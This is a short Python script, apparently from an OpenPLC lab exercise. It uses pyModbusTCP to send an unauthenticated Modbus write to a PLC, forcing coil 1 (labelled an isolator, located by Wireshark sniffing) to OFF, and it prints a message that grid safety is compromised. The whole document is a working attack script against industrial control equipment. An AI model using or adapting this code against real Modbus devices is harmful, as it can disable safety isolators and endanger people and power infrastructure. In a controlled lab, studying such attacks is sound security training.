from pyModbusTCP.client import ModbusClient

# --- Configuration ---
PLC_IP = "10.227.133.35"  # From your OpenPLC Monitoring tab
PORT = 502
# We are targeting Reference 1 (Isolator) which we sniffed in Wireshark
TARGET_COIL = 1 

# Connect to the PLC
client = ModbusClient(host=PLC_IP, port=PORT, auto_open=True)

print(f"[*] Sending unauthorized command to PLC at {PLC_IP}...")

# Inject a 'False' command to turn off the Isolator remotely
if client.write_single_coil(TARGET_COIL, False):
    print("[+] SUCCESS: Isolator forced OFF. Grid safety compromised.")
else:
    print("[-] FAILURE: Could not connect to the PLC.")

client.close()